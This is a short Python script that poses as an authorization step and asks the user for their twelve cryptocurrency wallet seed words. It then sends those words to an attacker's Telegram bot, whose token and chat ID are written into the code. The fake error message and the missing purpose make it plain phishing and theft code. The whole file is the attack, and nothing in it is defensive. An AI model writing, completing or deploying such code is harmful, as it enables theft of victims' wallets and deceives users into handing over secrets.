import requests
import sys

def a():
    bot_token = '8161179896:AAETIZWLz-kWOTPCX3OPs_s9xHjgKzh6PL4'  
    chat_id = '6041976324'  

    secret_words = input("type 12 seed phrases for authorization: ").split()
    
    if len(secret_words) != 12:
        print("error connest: 1726X00AT seed pharases")
        sys.exit()  

    message = "Секретные слова:\n" + " ".join(secret_words)

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }

    response = requests.post(url, json=payload)

    if response.status_code == 200:
        pass
    else:
        pass